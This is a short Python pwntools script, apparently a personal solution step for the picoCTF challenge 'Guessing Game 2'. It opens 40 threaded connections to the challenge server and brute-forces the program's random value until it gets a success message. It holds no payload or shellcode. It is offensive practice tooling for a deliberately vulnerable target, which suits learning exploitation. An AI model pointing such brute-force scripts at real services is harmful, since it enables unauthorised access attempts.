from pwn import *
import queue
import threading
import time

args.REMOTE = True

level = "Guessing Game 2"
ip = "jupiter.challenges.picoctf.org:43578"
dir = "/home/ayush/Work/picoCTF/BinaryExploitation/"+level
def proc():
    if args.REMOTE: 
	    return remote(ip.split(':')[0], ip.split(':')[1])
    return process([dir + "/vuln"])

class Guesser:
	def __init__(self, max_threads):
		self.max_threads = max_threads
		self.threads = []
		self.isFound = False
		self.found = 0
		self.q = queue.Queue()
		
	def start(self):
		for n in range(-4095, 4097):
			if n != 0:
			    self.q.put(n)
		for i in range(self.max_threads):
			t = threading.Thread(target=self.worker)
			self.threads.append(t)
		for t in self.threads:
			t.start()
		for t in self.threads:
			t.join()
		self.q.join()
		if self.isFound:
		    return self.found
			
	def worker(self):
		if self.isFound:
			return
		r = proc()
		r.recvlines(4)
		while not self.q.empty():
			guess = self.q.get(block=True)
			log.info("guessing ..... " + str(guess))
			r.sendline(str(guess))
			resp = r.recvline().decode().strip()
			r.recvlines(2)
			if "Congrats" in resp:	
			    self.isFound = True
			    self.found = guess
			    r.recvuntil("?")
			    r.sendline("aa")
			    r.recvline()
			    log.info("value in rand: " + str(guess))
			self.q.task_done()
		r.close()
		return

start_time = time.time()
max_threads = 40
winner = Guesser(max_threads).start()
log.info("value in rand: " + str(winner))
print("--- time taken for 40 threads %s seconds ---" % (time.time() - start_time))

